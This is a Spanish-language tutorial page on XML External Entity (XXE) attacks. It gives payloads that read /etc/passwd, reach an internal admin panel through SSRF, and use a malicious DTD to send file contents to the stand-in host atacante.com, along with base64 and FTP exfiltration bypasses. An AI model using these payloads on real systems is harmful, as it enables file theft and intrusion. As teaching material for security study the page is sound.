---
icon: folder-magnifying-glass
---

# XXE - XML External Entity



> **XML External Entity (XXE)** es una vulnerabilidad web que ocurre cuando una aplicación procesa datos XML proporcionados por el usuario utilizando un analizador (parser) XML mal configurado.

La vulnerabilidad no reside en el lenguaje XML en sí, sino en una característica heredada del estándar: la capacidad de definir **Entidades Externas** dentro del DOCTYPE.

Si el parser no tiene desactivada esta función, un atacante puede obligar al servidor a leer archivos locales del sistema, interactuar con la red interna (SSRF) o causar una denegación de servicio (DoS).

### Vectores de Ataque Principales

#### Extracción de Archivos Locales (LFI vía XXE)

El atacante define una entidad externa usando el protocolo `file://` para obligar al servidor a leer un archivo sensible del disco duro y devolver su contenido en la respuesta HTTP.

**Petición original legítima:**

```xml
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<usuario>
    <nombre>admin</nombre>
    <password>123456</password>
</usuario>
```

**Petición inyectada:** El atacante inyecta el `DOCTYPE` y llama a la entidad dentro de un campo que sabe que el servidor va a reflejar en la respuesta (por ejemplo, en un mensaje de error tipo "El usuario X no existe").

```xml
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<usuario>
    <nombre>&xxe;</nombre>
    <password>123456</password>
</usuario>
```

_Si el servidor es vulnerable, el contenido de `/etc/passwd` aparecerá reflejado en la respuesta HTTP._

#### Server-Side Request Forgery (SSRF vía XXE)

Si el atacante no quiere leer archivos, puede usar XXE para obligar al servidor web a realizar peticiones HTTP hacia la red interna de la empresa a la que el atacante no tiene acceso desde Internet. Se cambia el protocolo `file://` por `http://`.

**Payload SSRF:**

```xml
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://192.168.1.50/admin-panel"> 
]>
<usuario>
    <nombre>&xxe;</nombre>
</usuario>
```

_El servidor web (que sí tiene acceso a la red interna) hará la petición a la IP `192.168.1.50` y le devolverá el HTML del panel de administración al atacante._

### Blind XXE (Inyección Ciega y Exfiltración OOB)

Ocurre cuando el servidor procesa el XML y resuelve la entidad externa, pero **no refleja el resultado en la pantalla** (la aplicación solo responde "OK" o un "Error genérico").

Para explotar un Blind XXE y extraer datos, no podemos inyectar la entidad en el cuerpo del XML. En su lugar, utilizamos la técnica **OOB (Out-of-Band)** abusando de las **Entidades de Parámetro (`%`)**, las cuales se ejecutan íntegramente dentro del propio `DOCTYPE`.

#### Mecánica del Ataque Blind XXE

El ataque requiere obligar al servidor víctima a descargar un archivo DTD desde el servidor del atacante. Ese archivo externo contendrá una "cascada" de variables que leerán el archivo local y lo enviarán hacia fuera.

**Paso 1: Preparación del DTD malicioso (Servidor del Atacante)** El atacante levanta un servidor web (ej. `http://atacante.com`) y crea un archivo `malicioso.dtd`. Este archivo es complejo porque requiere anidar entidades para que se ejecuten en el orden correcto:

```
<!-- malicioso.dtd -->
<!-- 1. Carga el contenido del archivo en la entidad %payload -->
<!ENTITY % payload SYSTEM "file:///etc/hostname">

<!-- 2. Construye dinámicamente la URL de exfiltración concatenando el %payload -->
<!-- ATENCIÓN: El símbolo % debe ir codificado en HTML (&#x25;) dentro de otra entidad -->
<!ENTITY % exfiltracion "<!ENTITY &#x25; enviar SYSTEM 'http://atacante.com/?dato=%payload;'>">

<!-- 3. Llamadas de ejecución (El parser las lee de arriba a abajo) -->
%exfiltracion;
%enviar;
```

> **¿Por qué usamos `&#x25;`?** La especificación de XML prohíbe poner una Entidad de Parámetro (`%`) directamente dentro de otra. Para engañar al parser, usamos su valor codificado `&#x25;`. Cuando el parser lee la línea, decodifica el valor y lo convierte en un `%` funcional listo para ser ejecutado en el siguiente paso.

**Paso 2: Inyección del Payload (Servidor Víctima)** El atacante intercepta la petición web de la víctima y le inyecta una Entidad de Parámetro que apunta a su archivo externo:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!-- Le dice al parser que vaya a buscar las reglas a la IP del atacante -->
  <!ENTITY % xxe SYSTEM "http://atacante.com/malicioso.dtd">
  <!-- Lo ejecuta al instante -->
  %xxe;
]>
<usuario>admin</usuario>
```

**Paso 3: El robo de datos en los Logs**

1. La víctima lee `%xxe;` y descarga `malicioso.dtd`.
2. Lee el `/etc/hostname` y lo guarda en memoria.
3. Ejecuta `%enviar;`, lo que obliga al servidor a hacer una petición GET: `GET /?dato=servidor-web-prod-01 HTTP/1.1`
4. El atacante revisa los logs de acceso de su propio servidor web y lee el nombre de la máquina.

#### Limitaciones Reales: El problema de los saltos de línea

En la teoría el ataque anterior funciona perfectamente, pero en la práctica, si intentas extraer un archivo de múltiples líneas como `/etc/passwd`, el ataque fallará. _¿Por qué?_ Porque el protocolo HTTP GET no admite saltos de línea en medio de una URL. El parser intentará hacer `GET /?dato=root:x:0... [SALTO DE LÍNEA]` y la petición colapsará antes de salir del servidor víctima.

**Soluciones comunes en auditorías (Bypass):**

* **Uso de PHP Wrappers:** Si el servidor víctima corre sobre PHP, el atacante puede forzar que el archivo se codifique en Base64 antes de enviarlo. El Base64 es una cadena continua de texto sin saltos de línea, por lo que viajará perfectamente por HTTP: `<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">`
* **Exfiltración por FTP:** En lugar de enviar los datos a un servidor web (`http://`), el atacante levanta un servidor FTP malicioso que acepte conexiones corruptas y manda los datos por ahí, ya que FTP no se rompe con los saltos de línea en las peticiones.



